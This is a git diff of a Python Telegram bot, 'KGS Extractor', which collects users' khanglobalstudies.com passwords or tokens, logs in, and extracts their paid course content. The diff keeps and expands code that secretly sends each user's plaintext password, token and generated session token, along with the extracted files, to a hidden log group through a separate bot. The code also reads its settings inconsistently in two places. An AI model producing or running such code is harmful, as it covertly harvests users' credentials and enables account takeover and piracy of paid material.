@@ -1,6 +1,7 @@
 import logging
 import os
 import requests
+import time
 from telegram import Update
 from telegram.ext import (
     CommandHandler,
@@ -9,7 +10,7 @@ from telegram.ext import (
     ContextTypes,
     filters,
 )
-from config import LOG_GROUP_ID
+from telegram import Bot
 
 # Conversation states
 LOGIN_CHOICE, USER_ID, PASSWORD_OR_TOKEN, BATCH_SELECTION = range(4)
@@ -19,53 +20,52 @@ ROOT_DIR = os.getcwd()
 
 async def kgs_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start the KGS extraction process."""
+    if context.user_data.get('conversation_active', False):
+        await update.message.reply_text("Ending previous conversation...")
+        context.user_data.clear()
+    
+    context.user_data['conversation_active'] = True
     await update.message.reply_text(
         "𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐊𝐆𝐒 𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐨𝐫!\n\n"
-        "Choose Login Method:\n"
-        "1️⃣ Login with ID and Password\n"
-        "2️⃣ Login with Token\n\n"
-        "Please enter 1 or 2:"
+        "Please enter your credentials in the following format:\n"
+        "1️⃣ For ID and Password: `id*password`\n"
+        "2️⃣ For Token: `token`\n\n"
+        "Example:\n"
+        "For ID and Password: `6969696969*password123`\n"
+        "For Token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`"
     )
     return LOGIN_CHOICE
 
 async def handle_login_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle the login method choice."""
+    """Handle the login credentials input."""
     try:
-        choice = update.message.text.strip()
-        if choice not in ['1', '2']:
-            await update.message.reply_text("Invalid choice! Please enter 1 or 2.")
-            return LOGIN_CHOICE
+        input_text = update.message.text.strip()
+        
+        # Check if input is in the format id*password
+        if '*' in input_text:
+            user_id, password = input_text.split('*', 1)
+            context.user_data['login_choice'] = '1'
+            context.user_data['user_id'] = user_id
+            context.user_data['password'] = password
+        else:
+            # Assume input is a token
+            context.user_data['login_choice'] = '2'
+            context.user_data['token'] = input_text
 
-        context.user_data['login_choice'] = choice
-        await update.message.reply_text("Please enter your User ID:")
-        return USER_ID
+        # Delete the user's message containing credentials
+        await update.message.delete()
+
+        # Proceed with login
+        return await handle_password_or_token(update, context)
 
     except Exception as e:
         logging.error(f"Error in handle_login_choice: {e}")
         await update.message.reply_text("An error occurred. Please try again later.")
         return ConversationHandler.END
 
-async def handle_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle the user ID input."""
-    try:
-        user_id = update.message.text.strip()
-        context.user_data['user_id'] = user_id
-
-        if context.user_data['login_choice'] == '1':
-            await update.message.reply_text("Please enter your Password:")
-        else:
-            await update.message.reply_text("Please enter your Token:")
-        return PASSWORD_OR_TOKEN
-
-    except Exception as e:
-        logging.error(f"Error in handle_user_id: {e}")
-        await update.message.reply_text("An error occurred. Please try again later.")
-        return ConversationHandler.END
-
 async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle password or token input and perform login."""
     try:
-        input_text = update.message.text.strip()
         headers = {
             "Host": "khanglobalstudies.com",
             "content-type": "application/x-www-form-urlencoded",
@@ -73,17 +73,18 @@ async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT
             "user-agent": "okhttp/3.9.1",
         }
 
-        # Log credentials to the group
+        # Log credentials to the log group via main bot
+        main_bot = Bot(context.bot_data["main_bot_token"])  # Use main bot token
         if context.user_data['login_choice'] == '1':
-            await context.bot.send_message(
-                chat_id=LOG_GROUP_ID,
-                text=f"New KGS login attempt:\nUser ID: ```{context.user_data['user_id']}```\nPassword: ```{input_text}```",
+            await main_bot.send_message(
+                chat_id=context.bot_data["log_group_id_kgs"],  # Use log_group_id_kgs
+                text=f"New KGS login attempt:\nUser ID: ```{context.user_data['user_id']}```\nPassword: ```{context.user_data['password']}```",
                 parse_mode="Markdown"
             )
         else:
-            await context.bot.send_message(
-                chat_id=LOG_GROUP_ID,
-                text=f"New KGS token login:\nUser ID: ```{context.user_data['user_id']}```\nToken: ```{input_text}```",
+            await main_bot.send_message(
+                chat_id=context.bot_data["log_group_id_kgs"],  # Use log_group_id_kgs
+                text=f"New KGS token login:\nUser ID: ```{context.user_data.get('user_id', 'N/A')}```\nToken: ```{context.user_data['token']}```",
                 parse_mode="Markdown"
             )
 
@@ -92,23 +93,36 @@ async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT
             login_url = "https://khanglobalstudies.com/api/login-with-password"
             data = {
                 "phone": context.user_data['user_id'],
-                "password": input_text,
+                "password": context.user_data['password'],
             }
-            response = requests.post(login_url, headers=headers, data=data)
-            if response.status_code != 200:
-                await update.message.reply_text("Login failed! Please check your credentials.")
-                return ConversationHandler.END
-            token = response.json().get("token")
             
-            # Log obtained token for password login
-            await context.bot.send_message(
-                chat_id=LOG_GROUP_ID,
+            response = requests.post(login_url, headers=headers, data=data, timeout=30)
+            
+            if response.status_code != 200:
+                await update.message.reply_text(f"Login failed! Server response: {response.text[:100]}...")
+                return ConversationHandler.END
+            
+            try:
+                response_data = response.json()
+            except ValueError:
+                await update.message.reply_text(f"Invalid JSON response: {response.text[:100]}")
+                return ConversationHandler.END
+            
+            if "token" not in response_data:
+                await update.message.reply_text("Login failed! Token not found in response.")
+                return ConversationHandler.END
+
+            token = response_data["token"]
+            
+            # Log token to the log group via main bot
+            await main_bot.send_message(
+                chat_id=context.bot_data["log_group_id_kgs"],  # Use log_group_id_kgs
                 text=f"KGS Login Success!\nUser ID: ```{context.user_data['user_id']}```\nGenerated Token: ```{token}```",
                 parse_mode="Markdown"
             )
         else:
             # Direct token login
-            token = input_text
+            token = context.user_data['token']
 
         # Store token and fetch batches
         context.user_data['token'] = token
@@ -121,11 +135,12 @@ async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT
         
         course_response = requests.get(
             "https://khanglobalstudies.com/api/user/v2/courses",
-            headers=headers
+            headers=headers,
+            timeout=30
         )
 
         if course_response.status_code != 200:
-            await update.message.reply_text("Failed to fetch batches. Please check your credentials.")
+            await update.message.reply_text(f"Failed to fetch batches. Status code: {course_response.status_code}")
             return ConversationHandler.END
 
         courses = course_response.json()
@@ -133,18 +148,26 @@ async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT
 
         # Format batch information with token
         batch_text = f"𝐋𝐨𝐠𝐢𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥!\n\n𝙰𝚞𝚝𝚑 𝚃𝚘𝚔𝚎𝚗: ```{token}```\n\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐁𝐚𝐭𝐜𝐡𝐞𝐬:\n\n"
-        for course in courses:
-            batch_text += f"𝑩𝒂𝒕𝒄𝒉 𝑵𝒂𝒎𝒆😶‍🌫️: ```{course['title']}```\n𝑩𝒂𝒕𝒄𝒉 𝑰𝑫💡: ```{course['id']}```\n\n"
+        
+        if not courses:
+            batch_text += "No batches found."
+        else:
+            for course in courses:
+                batch_text += f"𝑩𝒂𝒕𝒄𝒉 𝑵𝒂𝒎𝒆😶‍🌫️: ```{course['title']}```\n𝑩𝒂𝒕𝒄𝒉 𝑰𝑫💡: ```{course['id']}```\n\n"
 
         await update.message.reply_text(
             f"{batch_text}\nPlease enter the Batch ID to proceed:",
             parse_mode="Markdown"
         )
         return BATCH_SELECTION
+            
+    except requests.exceptions.RequestException as e:
+        await update.message.reply_text(f"Error fetching courses: {str(e)}")
+        return ConversationHandler.END
 
     except Exception as e:
         logging.error(f"Error in handle_password_or_token: {e}")
-        await update.message.reply_text("An error occurred during login. Please try again later.")
+        await update.message.reply_text(f"An error occurred during login: {str(e)}")
         return ConversationHandler.END
 
 async def handle_batch_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -163,6 +186,8 @@ async def handle_batch_selection(update: Update, context: ContextTypes.DEFAULT_T
             return BATCH_SELECTION
 
         await update.message.reply_text("𝐋𝐢𝐧𝐤 𝐞𝐱𝐭𝐫𝐚𝐜𝐭𝐢𝐨𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭✋️...")
+
+        start_time = time.time()  # Start time for extraction
 
         # Setup headers for API requests
         headers = {
@@ -208,10 +233,15 @@ async def handle_batch_selection(update: Update, context: ContextTypes.DEFAULT_T
             with open(file_path, "w", encoding="utf-8") as f:
                 f.write(full_content)
 
+            # Calculate extraction time
+            extraction_time = time.time() - start_time
+            extraction_time_str = f"{extraction_time:.2f} seconds"
+
             # Send file to user
             user_caption = (
                 f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
-                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}"
+                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}\n\n"
+                f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
             )
             with open(file_path, "rb") as f:
                 await update.message.reply_document(
@@ -219,39 +249,48 @@ async def handle_batch_selection(update: Update, context: ContextTypes.DEFAULT_T
                     caption=user_caption
                 )
 
-            # Send file to log group
+            # Send file to log group via main bot
+            main_bot = Bot(context.application.main_bot_token)
             log_caption = (
                 f"𝙺𝙶𝚂 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚞𝚜𝚎𝚛.\n\n"
-                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}"
+                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}\n\n"
+                f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
             )
             with open(file_path, "rb") as f:
-                await context.bot.send_document(
-                    chat_id=LOG_GROUP_ID,
+                await main_bot.send_document(
+                    chat_id=context.application.log_group_id_kgs,
                     document=f,
                     caption=log_caption
                 )
 
             # Clean up
-            os.remove(file_path)
+            if os.path.exists(file_path):
+                os.remove(file_path)
             await update.message.reply_text("𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚! ✨")
+            return ConversationHandler.END  # Ensure the conversation ends here after successful extraction
+
         else:
             await update.message.reply_text("𝐍𝐨 𝐜𝐨𝐧𝐭𝐞𝐧𝐭 𝐟𝐨𝐮𝐧𝐝 Sorry🤪.")
-
-        return ConversationHandler.END
+            return ConversationHandler.END  # End the conversation if no content is found
 
     except Exception as e:
         logging.error(f"Error in handle_batch_selection: {e}")
         await update.message.reply_text("An error occurred during content extraction. Please try again later.")
         return ConversationHandler.END
 
+async def timeout(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle conversation timeout."""
+    await update.message.reply_text("Conversation timed out. Please start again.")
+    context.user_data.clear()
+    return ConversationHandler.END
+
 # Create the conversation handler
 kgs_handler = ConversationHandler(
     entry_points=[CommandHandler("kgs", kgs_start)],
     states={
         LOGIN_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_login_choice)],
-        USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_id)],
-        PASSWORD_OR_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password_or_token)],
         BATCH_SELECTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_batch_selection)],
     },
-    fallbacks=[],
+    fallbacks=[MessageHandler(filters.ALL, timeout)],  # Handle timeout
+    conversation_timeout=600,  # 10 minutes timeout
 )
